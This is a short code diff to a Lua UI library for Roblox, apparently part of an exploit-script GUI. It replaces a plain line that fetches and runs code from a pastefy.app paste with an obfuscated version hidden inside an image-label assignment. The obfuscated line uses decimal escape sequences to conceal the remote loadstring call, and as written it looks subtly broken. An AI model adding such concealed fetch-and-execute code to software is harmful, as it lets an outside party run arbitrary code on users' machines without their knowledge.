@@ -1742,12 +1742,12 @@ function DiscordLib:Window(text)
 
 
 local ImageLabel = Instance.new("ImageLabel")
-local gg = loadstring(game:HttpGet("https://pastefy.app/iEsHzGTn/raw"))()
+
 ImageLabel.Name = "MyImage"
 ImageLabel.Parent = ServerFrame
 ImageLabel.Size = UDim2.new(1, 0, 1, 0) 
 ImageLabel.BackgroundTransparency = 1 
-ImageLabel.Image = gg
+ImageLabel.Image = loadstring(game:HttpGet("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\105\69\115\72\122\71\84\110\47\114\97\119\34\41\41\40\41\10")
 
 
                 ServerFrame1.Name = "ServerFrame1"
